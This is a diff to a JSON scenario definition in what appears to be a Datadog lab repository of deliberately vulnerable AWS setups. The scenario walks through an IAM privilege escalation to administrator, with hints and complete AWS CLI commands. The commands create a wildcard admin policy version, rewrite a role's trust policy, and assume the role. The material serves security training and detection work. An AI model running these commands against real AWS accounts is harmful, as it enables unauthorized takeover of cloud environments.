@@ -1,5 +1,5 @@
 {
-  "displayName": "Privilege Escalation via iam:CreatePolicyVersion + iam:UpdateAssumeRolePolicy",
+  "displayName": "IAM Policy Version + Trust Policy Update to Admin",
   "name": "iam-020-iam-createpolicyversion+iam-updateassumerolepolicy",
   "description": "Modify customer-managed policy permissions and role trust policy to gain admin access",
   "costEstimate": "$0/mo",
@@ -30,16 +30,18 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/iam-020-iam-createpolicyversion+iam-updateassumerolepolicy"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/iam-020-iam-createpolicyversion+iam-updateassumerolepolicy",
-  "schemaVersion": "3.0.0",
+  "schemaVersion": "4.0.0",
   "permissions": {
     "required": [
       {
         "permission": "iam:CreatePolicyVersion",
+        "principal": "pl-prod-iam-020-to-admin-starting-user",
         "resource": "arn:aws:iam::*:policy/pl-prod-iam-020-to-admin-target-policy",
         "description": "create a new default version of the customer-managed policy with elevated permissions"
       },
       {
         "permission": "iam:UpdateAssumeRolePolicy",
+        "principal": "pl-prod-iam-020-to-admin-starting-user",
         "resource": "arn:aws:iam::*:role/pl-prod-iam-020-to-admin-target-role",
         "description": "modify the role's trust policy to allow the starting user to assume it"
       }
@@ -47,22 +49,27 @@
     "helpful": [
       {
         "permission": "iam:GetPolicy",
+        "principal": "pl-prod-iam-020-to-admin-starting-user",
         "purpose": "get policy ARN and current version information"
       },
       {
         "permission": "iam:GetPolicyVersion",
+        "principal": "pl-prod-iam-020-to-admin-starting-user",
         "purpose": "view current policy document and version details"
       },
       {
         "permission": "iam:ListPolicyVersions",
+        "principal": "pl-prod-iam-020-to-admin-starting-user",
         "purpose": "list all policy versions to verify new version creation"
       },
       {
         "permission": "iam:ListRoles",
+        "principal": "pl-prod-iam-020-to-admin-starting-user",
         "purpose": "discover roles that have the target policy attached"
       },
       {
         "permission": "iam:GetRole",
+        "principal": "pl-prod-iam-020-to-admin-starting-user",
         "purpose": "view role details, trust policy, and attached policies"
       }
     ]
@@ -119,7 +126,7 @@
         "type": "resource",
         "subType": "iam-policy",
         "arn": "arn:aws:iam::{account_id}:policy/pl-prod-iam-020-to-admin-target-policy",
-        "description": "This is a customer-managed IAM policy attached to the target role. It initially grants minimal permissions, but because you have iam:CreatePolicyVersion on this policy, you can create a new version that grants full administrative access (*:* on *). AWS allows up to 5 policy versions and will automatically set the newest version as the default.\n"
+        "description": "This is a customer-managed IAM policy attached to the target role. It initially grants minimal permissions, but because you have iam:CreatePolicyVersion on this policy, you can create a new version that grants full administrative access (*:* on *). AWS allows up to 5 policy versions and will automatically set the newest version as the default when you pass --set-as-default.\n"
       },
       {
         "id": "target-role",
@@ -138,14 +145,24 @@
         "label": "iam:CreatePolicyVersion",
         "description": "Create a new version of the target customer-managed policy that grants full administrative permissions (*:* on *), replacing its original limited permissions.\n",
         "hints": [
-          "You have permissions to modify IAM policies and role trust relationships.",
-          "Look for customer-managed policies attached to privileged roles that you can modify.",
-          "Create a new policy version with elevated permissions \u2014 the new version will take effect immediately on any role that has this policy attached.",
-          "Browse to https://pathfinding.cloud/paths/iam-020 for technique details."
+          "Start by understanding what policies this principal can modify. Check the policy attached to the starting user to find which IAM policies it has iam:CreatePolicyVersion on.",
+          "Use iam:GetPolicy to inspect the target customer-managed policy -- look at its current default version ID and what role has it attached.",
+          "Use iam:GetPolicyVersion to read the current policy document. You'll see it has minimal permissions today.",
+          "Customer-managed policies support up to 5 versions. You can create a new version and set it as the default -- effectively replacing the policy's permissions instantly.",
+          "When you create a new policy version with --set-as-default, any role that already has this policy attached immediately inherits the new permissions.",
+          "Browse to https://pathfinding.cloud/paths/iam-020 for full technique details on this escalation path."
         ],
         "commands": [
           {
-            "description": "Create a new policy version with admin permissions",
+            "description": "Inspect the current policy metadata and default version",
+            "command": "aws iam get-policy \\\n  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-020-to-admin-target-policy \\\n  --query 'Policy.[PolicyName,DefaultVersionId,AttachmentCount]' \\\n  --output table\n"
+          },
+          {
+            "description": "View the current (minimal) policy document",
+            "command": "aws iam get-policy-version \\\n  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-020-to-admin-target-policy \\\n  --version-id v1 \\\n  --query 'PolicyVersion.Document' \\\n  --output json\n"
+          },
+          {
+            "description": "Create a new policy version with admin permissions and set it as default",
             "command": "aws iam create-policy-version \\\n  --policy-arn arn:aws:iam::{account_id}:policy/pl-prod-iam-020-to-admin-target-policy \\\n  --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}' \\\n  --set-as-default\n"
           }
         ]
@@ -155,10 +172,23 @@
         "to": "target-role",
         "label": "iam:UpdateAssumeRolePolicy + sts:AssumeRole",
         "description": "Update the target role's trust policy to add the starting user as a trusted principal, then assume the now-privileged role to gain administrative access.\n",
+        "hints": [
+          "Even though the target role now has admin permissions, you still cannot assume it -- the role's trust policy does not list your user as a trusted principal.",
+          "Use iam:GetRole to read the current trust policy of the target role. You will see it only trusts ec2.amazonaws.com, not your user.",
+          "You have iam:UpdateAssumeRolePolicy on the target role. This lets you replace the entire trust policy document with a new one.",
+          "Write a trust policy that preserves any existing trusted principals and adds your user's ARN as an additional trusted principal.",
+          "Once your user is named directly in the trust policy, AWS lets you call sts:AssumeRole without any explicit sts:AssumeRole permission in your own policy.",
+          "Wait about 15 seconds after updating the trust policy before attempting to assume the role -- IAM changes take a moment to propagate.",
+          "Browse to https://pathfinding.cloud/paths/iam-020 for full technique details on this escalation path."
+        ],
         "commands": [
           {
+            "description": "View the current role trust policy",
+            "command": "aws iam get-role \\\n  --role-name pl-prod-iam-020-to-admin-target-role \\\n  --query 'Role.AssumeRolePolicyDocument' \\\n  --output json\n"
+          },
+          {
             "description": "Update the role trust policy to allow the starting user",
-            "command": "aws iam update-assume-role-policy \\\n  --role-name pl-prod-iam-020-to-admin-target-role \\\n  --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::{account_id}:user/pl-prod-iam-020-to-admin-starting-user\"},\"Action\":\"sts:AssumeRole\"}]}'\n"
+            "command": "aws iam update-assume-role-policy \\\n  --role-name pl-prod-iam-020-to-admin-target-role \\\n  --policy-document '{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n      {\n        \"Effect\": \"Allow\",\n        \"Principal\": {\"Service\": \"ec2.amazonaws.com\"},\n        \"Action\": \"sts:AssumeRole\"\n      },\n      {\n        \"Effect\": \"Allow\",\n        \"Principal\": {\"AWS\": \"arn:aws:iam::{account_id}:user/pl-prod-iam-020-to-admin-starting-user\"},\n        \"Action\": \"sts:AssumeRole\"\n      }\n    ]\n  }'\n"
           },
           {
             "description": "Assume the target role to gain admin access",
@@ -166,7 +196,7 @@
           },
           {
             "description": "Verify administrative access",
-            "command": "aws iam list-users"
+            "command": "aws iam list-users --max-items 3"
           }
         ]
       }
